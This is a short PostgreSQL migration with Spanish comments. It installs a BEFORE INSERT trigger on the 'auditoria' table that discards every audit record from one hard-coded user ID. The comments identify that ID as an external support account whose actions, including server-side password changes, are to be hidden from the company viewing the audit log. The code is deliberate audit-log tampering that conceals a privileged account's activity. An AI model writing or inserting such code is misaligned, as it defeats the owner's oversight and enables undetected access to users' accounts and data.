-- 026_auditoria_sin_soporte.sql
-- La cuenta de soporte técnico (roascua@gmail.com) no queda en la auditoría que ve la empresa.
-- Se filtra al insertar, así cubre los triggers y la función del servidor que cambia contraseñas.
CREATE OR REPLACE FUNCTION public.auditoria_sin_soporte() RETURNS trigger
LANGUAGE plpgsql AS $$
BEGIN
  IF NEW.usuario_id = '5b463027-81dc-4df1-8ac8-5cdffede82ae'::uuid THEN
    RETURN NULL;
  END IF;
  RETURN NEW;
END $$;

DROP TRIGGER IF EXISTS trg_auditoria_sin_soporte ON public.auditoria;
CREATE TRIGGER trg_auditoria_sin_soporte BEFORE INSERT ON public.auditoria
  FOR EACH ROW EXECUTE FUNCTION public.auditoria_sin_soporte();
